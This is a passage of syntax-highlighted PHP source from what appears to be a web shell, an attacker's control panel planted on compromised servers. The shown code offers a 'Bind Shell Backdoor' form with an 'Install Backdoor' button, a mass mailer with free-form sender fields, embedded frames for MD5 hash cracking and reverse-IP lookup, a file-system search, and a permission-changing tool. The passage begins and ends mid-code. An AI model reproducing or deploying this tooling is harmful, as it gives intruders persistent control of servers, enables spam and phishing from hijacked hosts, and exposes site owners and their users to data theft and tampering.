    <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsg&#39;</span><span class="p">];</span>
    <span class="nv">$emsg</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;backcconnmsge&#39;</span><span class="p">];</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Bind Shell Backdoor:&amp;lt;/b&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;/br&amp;gt;&amp;lt;form name=form method=POST&amp;gt;</span>
<span class="s2">    Bind Port: &amp;lt;input type=&#39;text&#39; name=&#39;backconnectport&#39; value=&#39;5992&#39;&amp;gt;</span>
<span class="s2">    &amp;lt;input type=&#39;hidden&#39; name=&#39;use&#39; value=&#39;shbd&#39;&amp;gt;</span>
<span class="s2">    &amp;lt;input type=&#39;submit&#39; value=&#39;Install Backdoor&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$msg</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$emsg</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/center&amp;gt;&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;mler&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">)){</span>
        <span class="nv">$headers</span> <span class="o">=</span> <span class="s1">&#39;To: &#39;</span><span class="o">.</span><span class="nv">$dest_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="nv">$headers</span> <span class="o">.=</span> <span class="s1">&#39;From: &#39;</span><span class="o">.</span><span class="nv">$sender_name</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$sender_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$suppmail</span><span class="p">,</span><span class="nv">$sender_subj</span><span class="p">,</span><span class="nv">$sender_body</span><span class="p">,</span><span class="nv">$header</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Email sent!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Can&#39;t send email!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;input type=hidden name=act value=mler&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;table class=contents&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td class=barheader colspan=2&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;[ Mailer ]&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Your name:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sender_name</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Your e-mail:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sender_email</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_email</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;To:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dest_email</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dest_email</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Subject:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input size=70 type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sender_subj</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_subj</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Message:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">sender_body</span><span class="se">\&quot;</span><span class="s2"> cols=80 rows=10&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sender_body</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Send</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s1">&#39;dec&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &amp;lt;iframe</span>
<span class="x">    src =&quot;http://www.md5decrypter.co.uk/&quot;</span>
<span class="x">    height=&quot;600&quot;</span>
<span class="x">    width=&quot;100%&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/iframe&amp;gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s1">&#39;rev&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &amp;lt;iframe</span>
<span class="x">    src =&quot;http://www.yougetsignal.com/tools/web-sites-on-web-server//&quot;</span>
<span class="x">    height=&quot;600&quot;</span>
<span class="x">    width=&quot;100%&quot;&amp;gt;</span>
<span class="x">    &amp;lt;/iframe&amp;gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;search&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=barheader&amp;gt;.: </span><span class="si">$sh_name</span><span class="s2"> File-System Search :.&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_in</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_name</span> <span class="o">=</span> <span class="s2">&quot;(.*)&quot;</span><span class="p">;</span> <span class="nv">$search_name_regexp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_text_wwo</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_text_regexp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$found</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$found_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$found_f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$search_i_f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$search_i_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">&quot;name&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_name</span><span class="p">,</span>
            <span class="s2">&quot;name_regexp&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_name_regexp</span><span class="p">,</span>
            <span class="s2">&quot;text&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text</span><span class="p">,</span>
            <span class="s2">&quot;text_regexp&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text_regxp</span><span class="p">,</span>
            <span class="s2">&quot;text_wwo&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text_wwo</span><span class="p">,</span>
            <span class="s2">&quot;text_cs&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text_cs</span><span class="p">,</span>
            <span class="s2">&quot;text_not&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text_not</span>
        <span class="p">);</span>
        <span class="nv">$searchtime</span> <span class="o">=</span> <span class="nx">getmicrotime</span><span class="p">();</span>
        <span class="nv">$in</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$search_in</span><span class="p">));</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$in</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nx">tpfsearch</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
        <span class="nv">$searchtime</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nv">$searchtime</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$found</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;No files found!&quot;</span><span class="p">;}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$found</span><span class="p">;</span>
          <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
          <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table class=contents&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form method=POST&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dispd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;File or folder Name:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_name</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">)</span><span class="o">+</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_name_regexp</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_name_regexp</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; - Regular Expression&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Look in (Separate by </span><span class="se">\&quot;</span><span class="s2">;</span><span class="se">\&quot;</span><span class="s2">):&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_in</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">)</span><span class="o">+</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;A word or phrase in the file:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">search_text</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">50</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">5</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_text</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_text_regexp</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_text_regexp</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Regular Expression&quot;</span><span class="o">.</span>
           <span class="s2">&quot;  &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_text_wwo</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_text_wwo</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Whole words only&quot;</span><span class="o">.</span>
           <span class="s2">&quot;  &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_text_cs</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_text_cs</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Case sensitive&quot;</span><span class="o">.</span>
           <span class="s2">&quot;  &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_text_not</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_text_not</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; Find files NOT containing the text&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Search</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;/table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ls&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$dspact</span> <span class="o">=</span> <span class="nv">$act</span><span class="p">;</span>
        <span class="k">echo</span> <span class="nv">$searchtime</span><span class="o">.</span><span class="s2">&quot; secs (&quot;</span><span class="o">.</span><span class="nv">$search_i_f</span><span class="o">.</span><span class="s2">&quot; files and &quot;</span><span class="o">.</span><span class="nv">$search_i_d</span><span class="o">.</span><span class="s2">&quot; folders, &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">((</span><span class="nv">$search_i_f</span><span class="o">+</span><span class="nv">$search_i_d</span><span class="p">)</span><span class="o">/</span><span class="nv">$searchtime</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; objects per second).&amp;lt;/b&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;chmod&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$mode</span> <span class="o">=</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Change file-mode with error:&amp;lt;/b&amp;gt; can&#39;t get current value.&quot;</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$form</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$chmod_submit</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$octet</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">.</span><span class="nb">base_convert</span><span class="p">((</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$octet</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="nv">$form</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;Can&#39;t chmod to &quot;</span><span class="o">.</span><span class="nv">$octet</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="p">;}</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$form</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$perms</span> <span class="o">=</span> <span class="nx">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">);</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Changing file-mode (&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;), &quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">decoct</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)),</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$err</span><span class="o">?</span><span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$err</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&amp;lt;input type=hidden name=d value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=f value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=chmod&amp;gt;&amp;lt;table align=left width=300 border=0 cellspacing=0 cellpadding=5&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Owner&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=checkbox NAME=chmod_o[r] value=1&quot;</span><span 